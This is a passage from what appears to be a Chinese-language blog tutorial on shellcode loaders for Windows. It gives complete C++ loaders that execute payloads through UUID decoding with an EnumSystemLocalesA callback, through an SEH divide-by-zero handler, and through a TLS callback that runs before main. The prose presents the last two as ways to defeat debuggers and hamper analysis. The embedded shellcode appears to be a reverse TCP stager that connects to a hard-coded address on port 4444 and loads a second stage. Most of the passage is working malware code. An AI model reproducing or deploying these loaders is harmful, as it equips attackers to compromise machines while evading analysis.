class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Rpc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Rpcrt4.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//用于存放shellcode转的uuid的数组</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* uuids[] = &#123; <span class="string">&quot;008fe8fc-0000-3160-d264-8b523089e58b&quot;</span>,<span class="string">&quot;528b0c52-8b14-2872-0fb7-4a2631ff31c0&quot;</span>,<span class="string">&quot;7c613cac-2c02-c120-cf0d-01c74975ef52&quot;</span>,<span class="string">&quot;10528b57-428b-013c-d08b-407885c0744c&quot;</span>,<span class="string">&quot;8b50d001-2058-488b-1801-d385c9743c31&quot;</span>,<span class="string">&quot;348b49ff-018b-31d6-c0c1-cf0dac01c738&quot;</span>,<span class="string">&quot;03f475e0-f87d-7d3b-2475-e0588b582401&quot;</span>,<span class="string">&quot;0c8b66d3-8b4b-1c58-01d3-8b048b01d089&quot;</span>,<span class="string">&quot;5b242444-615b-5a59-51ff-e0585f5a8b12&quot;</span>,<span class="string">&quot;ffff80e9-5dff-3368-3200-00687773325f&quot;</span>,<span class="string">&quot;774c6854-0726-e889-ffd0-b89001000029&quot;</span>,<span class="string">&quot;685054c4-8029-006b-ffd5-6a0a68c0a82f&quot;</span>,<span class="string">&quot;0002689b-5c11-e689-5050-505040504050&quot;</span>,<span class="string">&quot;df0fea68-ffe0-97d5-6a10-56576899a574&quot;</span>,<span class="string">&quot;85d5ff61-74c0-ff0a-4e08-75ece8670000&quot;</span>,<span class="string">&quot;6a006a00-5604-6857-02d9-c85fffd583f8&quot;</span>,<span class="string">&quot;8b367e00-6a36-6840-0010-0000566a0068&quot;</span>,<span class="string">&quot;e553a458-d5ff-5393-6a00-5653576802d9&quot;</span>,<span class="string">&quot;d5ff5fc8-f883-7d00-2858-68004000006a&quot;</span>,<span class="string">&quot;0b685000-0f2f-ff30-d557-68756e4d61ff&quot;</span>,<span class="string">&quot;ff5e5ed5-240c-850f-70ff-ffffe99bffff&quot;</span>,<span class="string">&quot;29c301ff-75c6-c3c1-bbf0-b5a2566a0053&quot;</span>,<span class="string">&quot;9090d5ff-9090-9090-9090-909090909090&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">UuidLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建一个具有执行权限的堆</span></span><br><span class="line">    HANDLE hc = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在堆上分配一块可执行内存</span></span><br><span class="line">    <span class="type">void</span>* buffer = <span class="built_in">HeapAlloc</span>(hc, <span class="number">0</span>, <span class="number">0x100000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查内存分配是否成功，如果失败则输出错误信息并返回0</span></span><br><span class="line">    <span class="keyword">if</span> (buffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;内存申请失败！&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    PBYTE buffer_backup = (PBYTE)buffer;  <span class="comment">//定义一个存储uuid转换成的二进制字节序列(shellcode)</span></span><br><span class="line">    <span class="type">int</span> elems = <span class="built_in">sizeof</span>(uuids) / <span class="built_in">sizeof</span>(uuids[<span class="number">0</span>]);  <span class="comment">//获取uuid数组元素的个数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    UuidFromStringA函数将UUID值转换成二进制字节序列,其语法格式如下:</span></span><br><span class="line"><span class="comment">    RPC_STATUS UuidFromStringA(</span></span><br><span class="line"><span class="comment">        RPC_CSTR StringUuid,  //指向uuid形式的字符串的指针</span></span><br><span class="line"><span class="comment">        UUID * Uuid  //用于接收二进制字节序列的指针</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 遍历uuids数组,并将UUID转换回原始的shellcode,然后存储在buffer_backup地址</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; elems; i++) &#123;</span><br><span class="line">        RPC_STATUS status = <span class="built_in">UuidFromStringA</span>((RPC_CSTR)uuids[i], (UUID*)buffer_backup);</span><br><span class="line">        <span class="keyword">if</span> (status != RPC_S_OK) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;UuidFromStringA() != S_OK&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="built_in">CloseHandle</span>(buffer);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        buffer_backup += <span class="number">16</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">   EnumSystemLocalesA函数用于枚举系统中支持的所有区域设置,其语法格式如下:</span></span><br><span class="line"><span class="comment">   BOOL EnumSystemLocalesA(</span></span><br><span class="line"><span class="comment">     LOCALE_ENUMPROCA lpLocaleEnumProc,  //处理每个枚举到的区域设置信息的回调函数的地址</span></span><br><span class="line"><span class="comment">     DWORD            dwFlags  //指定枚举的方式</span></span><br><span class="line"><span class="comment">   );</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">    <span class="comment">// 使用 EnumSystemLocalesA 函数调用转换回的 shellcode</span></span><br><span class="line">    <span class="built_in">EnumSystemLocalesA</span>((LOCALE_ENUMPROCA)buffer, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭内存句柄</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 调用 UuidLoader 函数</span></span><br><span class="line">    <span class="built_in">UuidLoader</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="9-基于SEH异常处理"><a href="#9-基于SEH异常处理" class="headerlink" title="9.基于SEH异常处理"></a>9.基于SEH异常处理</h1><h2 id="什么是SEH"><a href="#什么是SEH" class="headerlink" title="什么是SEH"></a>什么是SEH</h2><p>SEH（Structured Exception Handling，结构化异常处理）是Windows操作系统中的一种错误处理和异常处理机制。SEH提供了一种强大、灵活且通用的方法来处理异常，它使得开发者能够为应用程序中发生的运行时错误和异常编写自定义的处理代码</p>
<p>SEH的工作原理是在程序中建立一个异常处理函数链。每个异常处理函数都负责处理特定的异常。当程序运行时遇到异常，操作系统会沿着异常处理函数链寻找适当的处理函数。如果找到合适的异常处理函数，系统将调用该函数并处理异常。如果没有找到合适的处理函数，系统将终止程序</p>
<p><img src="/shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/assets/-M3GuIlaAXU8NbJTCRei/-M7u7TrzN0Wym0qmjjSg/-M7u9bFpgHXC3vjN9d5g/image.png" alt="img"></p>
<p>在C++中，可以使用<code>_try</code>、<code>_except</code>和<code>_finally</code>关键字来实现SEH异常处理。<code>_try</code>块包含可能引发异常的代码；<code>_except</code>块包含处理异常的代码；而<code>_finally</code>块包含在任何情况下都应执行的代码，无论是否发生异常	</p>
<p>SEH的一个重要特点是它与语言无关，因此可以在C、C++等语言中使用。然而，C++提供了另一种异常处理机制：C++异常处理（<code>try</code>、<code>catch</code>和<code>throw</code>关键字）。C++异常处理机制更符合C++语言的面向对象特性，通常在C++程序中更为常用。然而，在某些情况下，SEH仍然具有独特的优势，例如在处理特定的Windows异常或与C代码交互时</p>
<h2 id="实现代码-2"><a href="#实现代码-2" class="headerlink" title="实现代码"></a>实现代码</h2><p>这种方式加载shellcode的一个好处就是在调试器环境下和正常运行环境下表现不同。当程序在调试器中运行时，调试器会接管异常处理，从而使得程序在除零异常处停止，而不会执行shellcode。这使得恶意代码的执行在调试环境下被阻止，为分析和调试带来困难</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 存储要执行的shellcode</span></span><br><span class="line"><span class="type">char</span> shellcode[] = </span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x31\xff\x0f\xb7&quot;</span></span><br><span class="line"><span class="string">&quot;\x4a\x26\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\x20\x01\xd3\x50\x85\xc9\x74\x3c\x49\x31\xff\x8b\x34&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80&quot;</span></span><br><span class="line"><span class="string">&quot;\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x2f\x9b\x68\x02\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74&quot;</span></span><br><span class="line"><span class="string">&quot;\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b&quot;</span></span><br><span class="line"><span class="string">&quot;\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e&quot;</span></span><br><span class="line"><span class="string">&quot;\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x53\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义异常处理函数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ExceptFilter</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	b = <span class="number">1</span>; <span class="comment">// 修改b的值为1，以防止无限循环的异常处理</span></span><br><span class="line">	((<span class="built_in">void</span>(*)(<span class="type">void</span>)) &amp; shellcode)(); <span class="comment">// 强制转换shellcode的类型，并执行</span></span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION; <span class="comment">// 在处理完异常后，程序继续执行异常发生位置的代码</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	EXCEPTION_CONTINUE_EXECUTION返回值会导致程序在处理完异常后重新执行引发异常的那一行代码。</span></span><br><span class="line"><span class="comment">	由于ExceptFilter函数已经修改了变量b的值（将其设置为1），再次执行a / b时将不会触发异常。</span></span><br><span class="line"><span class="comment">	因此，这个程序不会反复加载shellcode</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	异常处理函数的返回值除了有EXCEPTION_CONTINUE_EXECUTION,还有以下两个值:</span></span><br><span class="line"><span class="comment">	EXCEPTION_EXECUTE_HANDLER:异常处理器已处理异常，程序应在_except块内继续执行</span></span><br><span class="line"><span class="comment">	EXCEPTION_CONTINUE_SEARCH:异常处理器未处理异常，程序应继续搜索其他异常处理器</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	_try <span class="comment">// 尝试执行可能引发异常的代码块</span></span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="type">int</span> c = a / b; <span class="comment">// 故意执行除零操作以触发异常</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	_except(<span class="built_in">ExceptFilter</span>()) &#123; <span class="comment">// 当异常发生时，调用ExceptFilter函数处理</span></span><br><span class="line"></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="10-基于TLS机制"><a href="#10-基于TLS机制" class="headerlink" title="10.基于TLS机制"></a>10.基于TLS机制</h1><h2 id="什么是TLS"><a href="#什么是TLS" class="headerlink" title="什么是TLS"></a>什么是TLS</h2><p>线程局部存储（Thread Local Storage，TLS）是一种将数据与特定执行线程关联的机制。当在一个线程内部的各个函数调用之间共享数据，但不让其他线程访问时，可以使用TLS</p>
<h2 id="TLS回调函数"><a href="#TLS回调函数" class="headerlink" title="TLS回调函数"></a>TLS回调函数</h2><p>TLS提供了一个回调函数，在线程初始化和终止时会被调用，这个回调函数会在程序入口点(即main函数)之前执行，调试器通常会在主函数入口点设置断点，因此TLS回调函数经常被用作反调试手段</p>
<p>TLS回调函数允许我们编写并执行任意代码。TLS有两种类型：静态TLS和动态TLS。静态TLS将TLS相关数据硬编码在PE（Portable Executable）文件中，而动态TLS在运行时分配和管理TLS数据。</p>
<p>静态TLS是将TLS相关数据硬编码在PE（Portable Executable，可执行文件）中。静态TLS存储在PE头的<code>IMAGE_DATA_DIRECTORY DataDirectory[9]</code>位置，可以通过该位置找到TLS目录的详细信息</p>
<p>通过在TLS回调函数中加载和执行shellcode，我们可以在程序的正常执行流之前运行这段代码。这种方法可以绕过调试器设置的断点，增加分析和调试的难度</p>
<p>TLS回调函数遵循特殊的编写约定，与DLL主函数类似。回调函数使用以下类型定义：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span></span></span><br><span class="line"><span class="function"><span class="params">(NTAPI *PIMAGE_TLS_CALLBACK)</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"> PVOID DllHandle, <span class="comment">//DLL模块的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function"> DWORD Reason, <span class="comment">//调用原因。这个参数与DLL调用时的原因相同，例如：DLL_PROCESS_ATTACH（当进程加载DLL时）、DLL_THREAD_ATTACH（当线程创建时）等</span></span></span></span><br><span class="line"><span class="params"><span class="function"> PVOID Reserved  <span class="comment">//保留参数，通常用于区分DLL是显式加载还是隐式加载</span></span></span></span><br><span class="line"><span class="params"><span class="function"> )</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="实现代码-3"><a href="#实现代码-3" class="headerlink" title="实现代码"></a>实现代码</h2><p>这段代码的核心目的是在程序启动时，通过TLS回调函数来执行Shellcode，而不是在主函数中执行</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>) </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//用于存放shellcode的数组</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = </span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x18\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83&quot;</span></span><br><span class="line"><span class="string">&quot;\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span></span><br><span class="line"><span class="string">&quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x2f\x9b\x41\x54&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9&quot;</span></span><br><span class="line"><span class="string">&quot;\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f&quot;</span></span><br><span class="line"><span class="string">&quot;\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2&quot;</span></span><br><span class="line"><span class="string">&quot;\xf0\xb5\xa2\x56\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//TLS回调函数</span></span><br><span class="line"><span class="function">VOID NTAPI <span class="title">TlsCallBack</span><span class="params">(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">	&#123;	</span><br><span class="line">		HANDLE HeapHandle = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="built_in">sizeof</span>(shellcode), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		<span class="type">char</span>* buffer = (<span class="type">char</span>*)<span class="built_in">HeapAlloc</span>(HeapHandle, HEAP_ZERO_MEMORY, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">		<span class="built_in">memcpy</span>(buffer, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">		((<span class="built_in">void</span>(*)(<span class="type">void</span>)) buffer)();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//确保链接器在生成可执行文件时包含TLS相关的符号,即确保链接器知道程序使用了TLS功能和自定义的TLS回调函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_callback&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span 